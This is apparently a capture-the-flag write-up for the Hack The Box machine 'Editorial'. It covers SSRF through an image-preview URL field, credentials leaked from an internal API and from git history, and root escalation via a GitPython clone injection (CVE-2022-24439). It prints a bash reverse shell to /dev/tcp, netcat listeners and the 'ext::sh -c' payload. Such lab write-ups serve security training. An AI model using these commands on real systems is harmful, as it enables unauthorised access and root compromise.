
Running `nmap` on the victim's ip shows two open ports, `80` and `22`.

Visiting the ip, I am redirected to the domain `editorial.htb`, which I add to the hosts file.

```
echo "10.10.11.20  editorial.htb" | sudo tee -a /etc/hosts
```

In the directory `/uploads`, there is a form with the input form called `cover url`. If I run `nc -lnvp 5555`, and input `http://10.10.14.207:5555` in the url, and click `preview`, the listener got the ping.

```
nc -lnvp 5555

listening on [any] 5555 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.11.20] 59540
GET / HTTP/1.1
Host: 10.10.14.41:5555
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

#### Foothold

In the url form, I can send a request to `http://127.0.0.1:80`, this returns a `jpeg` file. 

Using Burp Intruder and the wordlist `/usr/share/seclists/Discovery/Infrastructure/common-http-ports.txt`, I can run a brute force search to see the output of these ports. Each port other than port `5000` outputs a `jpeg` file.

In the form on the `editorial.htb/upload` I input `http://127.0.0.1:5555` and click preview, a broken image comes up and I download it. I check the image at the command line:

```
file 994d3f3a-23e7-4892-9bfc-01fac9bbd3b9
994d3f3a-23e7-4892-9bfc-01fac9bbd3b9: JSON text data
```

I use `cat` on the json file and find an interesting endpoint, `"endpoint": "/api/latest/metadata/messages/authors",` and plug that into my form. After downloading that json file, there is a template email with the following login credentials: `dev:dev080217_devAPI!@`.

I use `ssh` to login to the box, `ssh dev@victim_ip`, and find the user flag in `/home/dev/user.txt`.

#### Lateral Movement

After getting the user flag, I enumerate the box and find a hidden `.git` file. This tells me that updates and changes made to the web app would be stored here.

I run `git log` to view the commit history and I notice the commit `change(api): downgrading prod to dev`, which looks interesting. I run `git showb73481bb823d2dfb49c44f4c1e6a7e11912ed8ae`, which is the git hash, and there is a template email with production credentials seen below: 

`prod:080217_Producti0n_2023!@`

Running `su prod`, I enter the password and get access to the prod user.

As the prod user I run `sudo -l` to see if prod has root rights to run any files and get the following output:

```
prod@editorial:/home/dev$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

I then cat the file to see what it does:

```
prod@editorial:/home/dev$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

The file is using the library `gitpython`, to see what version I run `pip freeze` and see `gitpython` is running version `GitPython==3.1.29`. After doing a google search I see there is a vulnerability CVE-2022-24439 with this library's version.

This CVE highlights that the issue is caused by inadequate validation of user input when handling remote URLs passed to the clone command. We can exploit this vulnerability to gain a shell with root privileges. To do this, we first create a script to obtain a reverse shell.

```
prod@editorial:/home/dev/apps$ echo "bash -i >& /dev/tcp/10.10.14.41/4444 0>&1" >
/tmp/shell.sh
```

Then locally I create a netcat listener:

```
nc -lnvp 4444
```

Then I run my script with `sudo python3`

```
prod@editorial:/home/dev/apps$ sudo /usr/bin/python3
/opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

And my local listener gets a root shell. I can find the root flag on `/root/root.txt`.





